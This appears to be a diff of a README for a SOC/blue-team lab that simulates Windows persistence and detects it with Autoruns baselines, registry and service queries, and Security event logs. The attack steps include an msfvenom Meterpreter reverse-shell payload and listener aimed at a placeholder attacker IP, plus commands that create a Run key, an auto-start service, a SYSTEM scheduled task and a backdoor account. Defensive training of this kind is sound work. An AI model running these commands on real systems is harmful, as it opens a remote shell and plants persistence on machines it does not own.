@@ -1,133 +1,187 @@
-# 🖥️ Endpoint Security Monitoring Lab
+Endpoint Security Monitoring — Lab 1: Windows Persistence Techniques & Detection
 
-## 📌 Objective
-To simulate attacker activity on a Windows endpoint and investigate persistence mechanisms using system tools and EDR.
+Objective
 
----
+To simulate common Windows persistence techniques used by attackers post-exploitation (Registry Run Keys, Windows Services, and Scheduled Tasks), and to detect, analyze, and validate these techniques using native Windows tools, Sysinternals Autoruns, and Windows Event Logs — from a SOC Analyst / Blue Team perspective.
 
-## 🚨 Scenario
-A suspicious alert was generated indicating potential unauthorized persistence on a Windows system.
+Tools Used
 
-The objective was to investigate the endpoint and identify:
-- Persistence techniques
-- Suspicious processes
-- Indicators of compromise
+ToolPurposeMetasploit Framework (msfvenom, msfconsole)Payload generation and reverse shell listener (attacker simulation)Python HTTP ServerPayload delivery to victim machineCMD / PowerShellNative Windows enumeration, registry, and service inspectionWMICProcess and system information queriesProcess ExplorerProcess-level analysisWindows Registry EditorManual inspection of persistence keysSysinternals Autoruns (GUI + PowerShell module)Startup/persistence baseline comparisonWindows Event Viewer / wevtutilSecurity and System log analysis
 
----
 
-## 🛠️ Tools Used
-- Sysmon
-- Autoruns (Sysinternals)
-- Windows Event Viewer
-- CMD / PowerShell
-- LimaCharlie EDR
+Step-by-Step Investigation
 
----
+1. Payload Creation & Delivery (Attacker Simulation)
 
-## ⚔️ Attack Simulation
+Action Taken: Generated a Windows reverse shell payload and set up a listener to simulate initial access, then delivered the payload via a local web server.
 
-### Initial Access
+Command/Query:
 
-![Meterpreter](screenshots/1_meterpreter.png)
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f exe -o payload.exe
 
-- Reverse shell established
-- Attacker gained access
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <ATTACKER_IP>
+set LPORT 4444
+exploit
 
----
+python3 -m http.server 8000
 
-## 🔧 Persistence Techniques Identified
+Screenshot:
+![Payload creation and listener setup](screenshots/01-payload-listener.png)
 
-### 1. Registry Persistence
+Observation: A Meterpreter session was successfully established after the victim machine executed the payload, confirming a reverse TCP connection back to the attacker-controlled listener on port 4444.
 
-![Command](screenshots/registry_1_command.png)
-![Evidence](screenshots/registry_2_entry.png)
-![Detection](screenshots/registry_3_autoruns.png)
+Result: Initial access simulated successfully — session used as the basis for post-exploitation persistence testing.
 
----
 
-### 2. Service Persistence
+2. Network & Process Enumeration (Post-Exploitation)
 
-![Command](screenshots/service_1_command.png)
-![Evidence](screenshots/service_2_created.png)
-![Detection](screenshots/service_3_autoruns.png)
+Action Taken: Enumerated active network sessions, shared resources, and running processes on the compromised host.
 
----
+Command/Query:
 
-### 3. Scheduled Task Persistence
+net view
+net share
+net session
+net use
+netstat -anob
+tasklist
+tasklist /V
+tasklist /FI "PID eq 2088" /M
+wmic process where processid=2088 get name,parentprocessid,processid
 
-![Command](screenshots/task_1_command.png)
-![Evidence](screenshots/task_2_created.png)
-![Detection](screenshots/task_3_autoruns.png)
+Screenshot:
+![Process and network enumeration](screenshots/02-process-enumeration.png)
 
----
+Observation: Identified active connections tied to the payload process and cross-referenced process IDs with parent processes using WMIC to trace execution lineage.
 
-## 🔍 Investigation
+Result: Confirmed the payload process and its network activity, establishing a baseline for anomaly detection.
 
-### Process Analysis
 
-![Process](screenshots/process.png)
+3. Registry Persistence (Run Keys)
 
-- Identified suspicious process
+Action Taken: Created a Registry Run Key to simulate an attacker establishing persistence, then verified it manually via Registry Editor, CMD, and PowerShell.
 
----
+Command/Query:
 
-### Network Analysis
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v NotABackdoor /t REG_SZ /d "C:\Users\Anzar\Downloads\notmalware.exe" /f
 
-![Network](screenshots/netstat.png)
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
 
-- Detected unusual outbound connection
+Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
 
----
+Screenshot:
+![Registry Run key persistence](screenshots/03-registry-run-key.png)
 
-### Event Log Analysis
+Observation: The malicious entry NotABackdoor pointing to a suspicious executable in the Downloads folder appeared under the Run key — a classic auto-start persistence location.
 
-![Logs](screenshots/event_logs.png)
+Result: Confirmed persistence via Registry Run Key; validated using both native CMD/PowerShell and manual Registry Editor navigation.
 
-- Event ID 4720 observed (New user creation)
 
----
+4. Windows Service Persistence
 
-### Autoruns Analysis
+Action Taken: Created a fake Windows service disguised with a legitimate-sounding name to simulate service-based persistence, then investigated it using service query commands.
 
-![Autoruns](screenshots/autoruns.png)
+Command/Query:
 
-- Multiple persistence mechanisms detected
+sc create BackupService binPath= "C:\Users\Anzar\Downloads\notmalware.exe" start= auto
 
----
+net start
+sc query
+sc query= all
+sc query BackupService
+sc qc BackupService
 
-## 📡 EDR Detection
+Screenshot:
+![Windows service persistence](screenshots/04-service-persistence.png)
 
-![LimaCharlie](screenshots/limacharlie_alert.png)
+Observation: sc qc BackupService revealed the BINARY_PATH_NAME pointing to an executable in the Downloads directory with START_TYPE = AUTO_START — both are strong indicators of malicious service persistence, since legitimate services rarely run from user profile folders.
 
-- Suspicious activity flagged by EDR
+Result: Identified suspicious service configuration consistent with attacker-created persistence disguised as a legitimate backup service.
 
----
 
-## 🧠 MITRE ATT&CK Mapping
+5. Scheduled Task Persistence
 
-- Persistence → T1547 (Registry Run Keys)
-- Persistence → T1050 (New Service)
-- Persistence → T1053 (Scheduled Task)
-- Command & Control → T1071
+Action Taken: Created a scheduled task running under the SYSTEM account to simulate high-privilege persistence, then queried and validated it.
 
----
+Command/Query:
 
-## 🚩 Findings
+schtasks /create /tn "SystemCleanup" /tr "C:\Users\Anzar\Downloads\notmalware.exe" /sc daily /st 09:00 /ru SYSTEM
 
-- Multiple persistence mechanisms established
-- Suspicious process execution observed
-- Malicious network activity detected
+schtasks /query /fo LIST
+schtasks /query /tn "SystemClean"
+schtasks /query /tn "SystemClean" /v /fo LIST
 
----
+Screenshot:
+![Scheduled task persistence](screenshots/05-scheduled-task.png)
 
-## 🧾 Conclusion
+Observation: The task was configured to run daily under the SYSTEM account — a red flag, since SYSTEM-level scheduled tasks executing unsigned binaries from user directories are a common privilege escalation and persistence pattern.
 
-This lab demonstrates how attackers maintain access using persistence techniques and how defenders can detect them using endpoint monitoring tools.
+Result: Confirmed scheduled task persistence with elevated privileges; cross-verified via CMD and Autoruns GUI.
 
----
 
-## 📚 Lessons Learned
+6. Autoruns Baseline Comparison (Detection Workflow)
 
-- Always verify startup entries
-- Correlate process + network + logs
-- Use multiple tools for validation
+Action Taken: Used the Sysinternals Autoruns PowerShell module to create a clean baseline before persistence changes, then captured a post-change state and compared both to isolate the injected persistence artifacts.
+
+Command/Query:
+
+Get-PSAutorun -VerifyDigitalSignature | Where-Object { -not($_.IsOSBinary) } | New-AutoRunsBaseLine -Verbose -FilePath .\Baseline.ps1
+
+Get-PSAutorun -VerifyDigitalSignature | Where-Object { -not($_.IsOSBinary) } | New-AutoRunsBaseLine -Verbose -FilePath .\CurrentState.ps1 -Force
+
+Compare-AutoRunsBaseLine -ReferenceBaseLineFile .\Baseline.ps1 -DifferenceBaseLineFile .\CurrentState.ps1 -Verbose
+
+Compare-AutoRunsBaseLine -ReferenceBaseLineFile .\Baseline.ps1 -DifferenceBaseLineFile .\CurrentState.ps1 | Where-Object { $_.SideIndicator -eq "=>" }
+
+Screenshot:
+![Autoruns baseline comparison](screenshots/06-autoruns-comparison.png)
+
+Observation: The filtered comparison (SideIndicator -eq "=>") isolated exactly the new entries added after the baseline — the Registry Run key, the service, and the scheduled task — with no noise from legitimate OS binaries.
+
+Result: Demonstrated an efficient, repeatable baseline-diffing workflow for detecting new persistence mechanisms on a Windows endpoint.
+
+
+7. Event Log Analysis (Account Creation/Deletion)
+
+Action Taken: Simulated attacker account creation and cleanup, then queried Security event logs for the corresponding events.
+
+Command/Query:
+
+net user backdoor password /add
+net user backdoor /delete
+
+wevtutil qe security /c:5 /f:text /rd:true
+wevtutil qe security /c:5 /f:text /rd:true /q:"*[System[(EventID=4720)]]"
+
+Screenshot:
+![Event log analysis](screenshots/07-event-log-analysis.png)
+
+Observation: Event ID 4720 (user account created) and Event ID 4726 (user account deleted) were logged in quick succession — a pattern consistent with an attacker creating a temporary backdoor account and removing it to cover tracks.
+
+Result: Validated detection of suspicious account lifecycle activity via native Windows Event Log querying.
+
+
+IOC Findings
+
+IndicatorTypeDescriptionpayload.exe / notmalware.exeFile NameMalicious executable dropped in Downloads directoryPort 4444NetworkDefault Meterpreter reverse TCP listener portNotABackdoorRegistry ValueSuspicious Run key entry under HKCU\...\CurrentVersion\RunBackupServiceService NameFake Windows service disguised with legitimate-sounding nameSystemCleanup / SystemCleanScheduled Task NameTask running under SYSTEM with daily triggerbackdoorUser AccountTemporary local account created and deleted to test account-based footholdsEvent ID 4720 / 4726Security LogUser account created / deletedEvent ID 7045System LogNew service installed
+
+
+MITRE ATT&CK Mapping
+
+Technique IDTechnique NameObserved ActivityT1547.001Boot or Logon Autostart Execution: Registry Run KeysPersistence via HKCU\...\CurrentVersion\RunT1543.003Create or Modify System Process: Windows ServiceBackupService created via sc createT1053.005Scheduled Task/Job: Scheduled TaskSystemCleanup task via schtasksT1036MasqueradingLegitimate-sounding names used for service/task (BackupService, SystemCleanup)T1136.001Create Account: Local Accountbackdoor account created via net userT1070Indicator Removalbackdoor account deleted after creationT1057Process Discoverytasklist, WMIC process queriesT1049System Network Connections Discoverynetstat -anobT1018Remote System Discoverynet viewT1135Network Share Discoverynet shareT1012Query Registryreg query, Get-ItemProperty
+
+
+Conclusion
+
+This lab simulated three of the most common Windows persistence techniques — Registry Run Keys, Windows Services, and Scheduled Tasks — and walked through the full detection lifecycle: manual registry/service/task inspection, automated baseline-diffing with Autoruns, and Security Event Log correlation. Each persistence method left identifiable artifacts (suspicious file paths, auto-start configurations, and privileged execution contexts) that a SOC Analyst can systematically detect using native Windows tools without relying solely on third-party EDR alerts.
+
+Key Learning
+
+
+Persistence mechanisms almost always share common red flags: execution from user-writable directories (Downloads, AppData, Temp), auto-start configuration, and legitimate-sounding but unverified names.
+Baseline-and-compare (Autoruns PowerShell module) is a far more scalable detection method than manually checking each persistence location one by one.
+Native Windows tools (reg, sc, schtasks, wevtutil) are sufficient for most persistence detection — no special tooling required, which matters in resource-constrained SOC environments.
+Event ID correlation (4720/4726 for accounts, 7045 for services) turns raw log noise into an actionable timeline of attacker behavior.
